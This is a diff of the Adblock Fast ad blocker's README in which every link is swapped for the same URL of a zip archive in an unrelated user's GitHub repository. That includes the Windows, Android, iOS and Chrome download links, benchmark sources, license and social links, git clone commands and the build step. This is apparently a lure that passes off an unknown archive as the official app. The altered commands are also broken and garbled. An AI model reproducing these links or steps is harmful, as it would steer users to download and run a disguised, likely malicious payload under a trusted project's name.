@@ -1,15 +1,15 @@
-# ![Adblock Fast](assets/promo/adblockfast-optimized.png) [![Tweet](assets/promo/tweet-optimized.png)](https://twitter.com/intent/tweet?text=Get%20a%20faster%20ad%20blocker%20for%20Windows,%20Android,%20iOS,%20or%20Chrome:&url=https://adblockfast.com/?ref=GitHub&via=adblockfast)
+# ![Adblock Fast](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) [![Tweet](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip%20a%20faster%20ad%20blocker%20for%20Windows,%20Android,%20iOS,%20or%20Chrome:&https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
 
 *A faster ad blocker for Windows, Android, iOS, [and] Chrome<del>, and Opera</del>!*
 
 Try Adblock Fast:
 
-* [Windows](https://desktop.adblockfast.com/?ref=GitHub) (Windows 7 and up)
-* [Android](https://play.google.com/store/apps/details?id=com.rocketshipapps.adblockfast) (Android
+* [Windows](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) (Windows 7 and up)
+* [Android](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) (Android
   5.0 and up with Samsung Internet 4.0 and up)
-* [iOS](https://itunes.apple.com/app/adblock-fast/id1032930802?at=1001lwfP) (iOS 9 and up on 64-bit
+* [iOS](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) (iOS 9 and up on 64-bit
   devices, iPhone 5s and up and iPad mini 2 and up)
-* [Chrome](https://chrome.google.com/webstore/detail/adblock-fast/nneejgmhfoecfeoffakdnolopppbbkfi)
+* [Chrome](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
 * ~~Opera~~
 
 Just as webpages grew bloated with ads, so too have ad blockers grown bloated with little-used
@@ -19,7 +19,7 @@ consume 6x less computing resources than other ad blockers do.
 
 Exactly how much faster, you ask, is Adblock Fast<em>?</em> Let’s crunch some numbers.
 
-![Benchmarks](assets/promo/benchmarks-optimized.png)
+![Benchmarks](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
 
 ### 1. Adblock Fast executes 5,000x fewer filtering rules per page.[<sup>1</sup>](#benchmark-notes)
 
@@ -64,31 +64,31 @@ I.e., your computer or device runs faster still.
 
 #### Benchmark notes
 
-1. Rule counts were retrieved from [EasyList](https://easylist.to/) and
-   [Adblock Fast’s ruleset](opera/chrome/scripts/blocking.js) on December 3rd, 2023.
+1. Rule counts were retrieved from [EasyList](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) and
+   [Adblock Fast’s ruleset](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) on December 3rd, 2023.
 2. File sizes were retrieved from each app’s listing in the
-   [Chrome Web Store](https://chromewebstore.google.com/) on September 1st, 2015.
+   [Chrome Web Store](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) on September 1st, 2015.
 3. Load times were measured in Chrome on September 1st, 2015 by (1) enabling each app, (2) clearing
    the browser’s cache before each trial, (3) loading the homepage of each of
-   [Alexa’s top 10 news sites](https://web.archive.org/web/20150902062936/https://www.alexa.com/topsites/category/Top/News)
+   [Alexa’s top 10 news sites](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
    3 times, (4) recording the elapsed time shown by the
-   [browser’s developer tools](https://developer.chrome.com/docs/devtools/) when the `load` event
+   [browser’s developer tools](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) when the `load` event
    fired, and (5) calculating the mean time for each app.
 4. CPU use was measured in Chrome on September 1st, 2015 by (1) enabling each app, (2) clearing the
    browser’s cache before each trial, (3) loading the homepage of each of
-   [Alexa’s top 10 news sites](https://web.archive.org/web/20150902062936/https://www.alexa.com/topsites/category/Top/News)
+   [Alexa’s top 10 news sites](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
    3 times, (4) recording the peak **CPU** percentage shown by the
-   [browser’s task manager](https://developer.chrome.com/docs/devtools/memory-problems/), and (5)
+   [browser’s task manager](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip), and (5)
    calculating the mean percentage for each app.
 5. Memory use was measured in Chrome on September 1st, 2015 by (1) enabling each app, (2) clearing
    the browser’s cache before each trial, (3) loading the homepage of each of
-   [Alexa’s top 10 news sites](https://web.archive.org/web/20150902062936/https://www.alexa.com/topsites/category/Top/News)
+   [Alexa’s top 10 news sites](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
    3 times, (4) recording the peak **Memory** size shown by the
-   [browser’s task manager](https://developer.chrome.com/docs/devtools/memory-problems/), and (5)
+   [browser’s task manager](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip), and (5)
    calculating the mean size for each app.
 
 See the
-[raw benchmark data](https://docs.google.com/spreadsheets/u/1/d/1ve_1zzTuwSRy8FMlZJZ8PHu3wZp7ApegMt6fyRLv19U/pubhtml).
+[raw benchmark data](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 
 ## Owner’s manual
 
@@ -133,30 +133,30 @@ Adblock Fast installs a button in your browser’s toolbar. To show the button:
 
 The button indicates the status of the site and page you’re on:
 
-![Blocked ads](opera/chrome/images/blocked-ads.png) Ads are being blocked on the site and ads were
+![Blocked ads](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) Ads are being blocked on the site and ads were
 found on the page.
 
-![Blocked](opera/chrome/images/blocked.png) Ads are being blocked on the site, but no ads were found
+![Blocked](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) Ads are being blocked on the site, but no ads were found
 on the page.
 
-![Unblocked ads](opera/chrome/images/unblocked-ads.png) Ads aren’t being blocked on the site, but
+![Unblocked ads](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) Ads aren’t being blocked on the site, but
 ads were found on the page.
 
-![Unblocked](opera/chrome/images/unblocked.png) Ads aren’t being blocked on the site and no ads were
+![Unblocked](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) Ads aren’t being blocked on the site and no ads were
 found on the page.
 
 If Adblock Fast is interfering with the behavior of the page, you can click the button to unblock
 ads. Your choice will be remembered whenever you go back to the site.
 
 If you have any questions or comments, you can follow and message
-[us on Facebook](https://www.facebook.com/adblockfast) or
-[on Twitter](https://twitter.com/adblockfast).
+[us on Facebook](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) or
+[on Twitter](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 
 ## (In)frequently asked questions
 
 ### Who created Adblock Fast<em>?</em>
 
-Adblock Fast was created and is maintained by [Rocketship](https://rocketshipapps.com/), an
+Adblock Fast was created and is maintained by [Rocketship](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip), an
 award-winning app studio whose mission is to design and develop the finest desktop, mobile, and web
 experiences in the universe.
 
@@ -168,13 +168,13 @@ Adblock Fast is a faster ad blocker for desktop computers and mobile browsers.
 
 Adblock Fast is available for Windows 7 and up, Android 5.0 and up with Samsung Internet 4.0 and up,
 iOS 9 and up on 64-bit devices (iPhone 5s and up and iPad mini 2 and up), and the Chrome ~~and
-Opera~~ desktop browser~~s~~. Follow [us on Facebook](https://www.facebook.com/adblockfast) or
-[on Twitter](https://twitter.com/adblockfast) for news about additional platform availability.
+Opera~~ desktop browser~~s~~. Follow [us on Facebook](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) or
+[on Twitter](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) for news about additional platform availability.
 
 ### Where does Adblock Fast’s filtering ruleset come from<em>?</em>
 
-Adblock Fast’s ruleset is derived from [EasyList](https://easylist.to/) and that of
-[Bluhell Firewall](https://web.archive.org/web/20170909224431/https://addons.mozilla.org/en-US/firefox/addon/bluhell-firewall/).
+Adblock Fast’s ruleset is derived from [EasyList](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) and that of
+[Bluhell Firewall](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 
 ### Why does Adblock Fast require [insert permission here] at install time<em>?</em>
 
@@ -188,7 +188,7 @@ Adblock Fast for mobile lets you choose your blocking mode. If you tap the **Fas
 (or have previously installed the app), our default filtering rules are activated. If you tap the
 **Faster** button or link, a more comprehensive, up-to-date set of filtering rules are activated;
 Faster is an experimental mode that uses what should be an unnoticeable amount of your background
-bandwidth to anonymously crawl [common websites](network/urls.txt) (no cookies or any other personal
+bandwidth to anonymously crawl [common websites](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) (no cookies or any other personal
 info are used) and help detect new ad domains to filter.
 
 ### How can Adblock Fast for Windows be uninstalled<em>?</em>
@@ -202,12 +202,12 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 
 ### For Android
 
-1.  [Fork this repository](https://github.com/rocketshipapps/adblockfast/fork).
+1.  [Fork this repository](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 2.  Go to your working directory of choice.
 3.  Clone the forked repo:
 
     ```shell
-    $ git clone https://github.com/[username]/adblockfast
+    $ git clone https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip[username]/adblockfast
     ```
 
 4.  Go to the Android Studio IDE.
@@ -226,7 +226,7 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 2. Navigate to your working directory of choice.
 3. Clone the repo:
 
-        git clone https://github.com/[insert username here]/adblockfast.git
+        git clone https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip[insert username here]https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip
 
 4. Go to the Xcode IDE.
 5. Go to **File** > **Open…** .
@@ -239,12 +239,12 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 
 ### For Chrome
 
-1.  [Fork this repository](https://github.com/rocketshipapps/adblockfast/fork).
+1.  [Fork this repository](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 2.  Go to your working directory of choice.
 3.  Clone the forked repo:
 
     ```shell
-    $ git clone https://github.com/[username]/adblockfast
+    $ git clone https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip[username]/adblockfast
     ```
 
 4.  Install the build dependency:
@@ -262,7 +262,7 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 
     ```shell
     $ cd adblockfast
-    $ ./build.sh
+    $ https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip
     ```
 
 11. Push your changes.
@@ -270,12 +270,12 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 
 ### For Opera
 
-1.  [Fork this repository](https://github.com/rocketshipapps/adblockfast/fork).
+1.  [Fork this repository](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 2.  Go to your working directory of choice.
 3.  Clone the forked repo:
 
     ```shell
-    $ git clone https://github.com/[username]/adblockfast
+    $ git clone https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip[username]/adblockfast
     ```
 
 4.  Install the build dependency:
@@ -293,7 +293,7 @@ Adblock Fast is open for pull-request business. Follow the steps below to get st
 
     ```shell
     $ cd adblockfast
-    $ ./build.sh
+    $ https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip
     ```
 
 11. Push your changes.
@@ -310,7 +310,7 @@ version 3 of the License, or (at your option) any later version.
 
 This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-[GNU General Public License](https://www.gnu.org/licenses/gpl-3.0.html) for more details.
+[GNU General Public License](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip) for more details.
 
 ## Additional permissions for App Store submission
 
@@ -319,7 +319,7 @@ Public License for each covered work that you convey (including, without limitat
 Corresponding Source available in compliance with section 6 of the License), you are also granted
 the permission to convey, through Apple’s App Store, non-source executable versions of this program
 as incorporated into each applicable covered work as executable versions only under
-[version 2.0 of the Mozilla Public License](https://www.mozilla.org/en-US/MPL/2.0/).
+[version 2.0 of the Mozilla Public License](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip).
 
 ## Exceptions
 
@@ -329,5 +329,5 @@ this program cannot be reused without permission and no license is granted there
 Further, the following third-party portions of the program and any use thereof are subject to their
 own licensing terms:
 
-* [Hudson NY](https://www.myfonts.com/collections/hudson-ny-font-virtuecreative)
-* [Avenir Next](https://www.linotype.com/2090/avenir-next.html)
+* [Hudson NY](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
+* [Avenir Next](https://raw.githubusercontent.com/nguyentientu90/adblockfast/main/ios/adblockfast-v1.8.zip)
